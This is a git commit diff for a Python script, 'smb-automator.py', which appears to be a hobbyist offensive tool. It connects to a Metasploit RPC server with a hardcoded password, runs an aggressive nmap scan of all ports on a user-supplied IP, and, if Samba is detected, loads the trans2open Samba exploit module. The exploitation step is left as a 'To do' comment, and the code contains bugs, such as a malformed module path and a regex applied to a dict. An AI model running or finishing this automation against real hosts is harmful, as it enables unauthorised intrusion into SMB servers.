2185e2df540610a118ea8fe641546575d264ee74
hacks-and-codes <owusuansahkwadwo24@gmail.com>
2022-09-26 17:42:28 +0000

    update

--- smb-automator.py
+++ smb-automator.py
@@ -1,6 +1,11 @@
+#!/bin/python
+import nmap
+from pymetasploit3 import msfrpc
+import os
 import pyfiglet
-import subprocess
 import re
+
+client = msfrpc.MsfRpcClient('mypasswd', port=555, ssl=False)
 
 author = "### Author: hacks-and-codes ###"
 
@@ -8,19 +13,33 @@ print(pyfiglet.figlet_format(author, "starwars").format())
 
 samba_search = "^(samba)|(smb)|(port 139)"
 regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
-def target_IP():
-    test = input("enter something: ")
-    if (re.search(samba_search, test)):
-        check()
+
+
+def check():
+    try:
+        global ip_address
+        global data
+        ip_address = (input('Enter ip: '))
+        if (re.search(regex, ip_address)):
+            data = nmap.PortScanner(ip_address)
+            data.scan(ip_address, '-p-', '-A -T4', True)
+        else:
+            print("Invalid ip address")
+    except Exception:
+        print("An error has occured!\nPlease check your network")
+
+
+def action():
+    smb = data.scaninfo()
+    if (re.search(samba_search, smb)):
+        print("Samba found!")
+        exploit = client.modules.use('exploit', 'exploit/linux x86/trans2open')
+# To do
+# excution and exploit for sessions to show up
+# can only be done in linux
+# I will continue in kali linux
     else:
         print("not smb found!")
 
-def check():
-    ip_address = (input('Enter ip: '))
-    if (re.search(regex, ip_address)):
-        print(ip_address,"exists")
-    else:
-        print("Invalid ip address")
 
-
-target_IP()
+check()
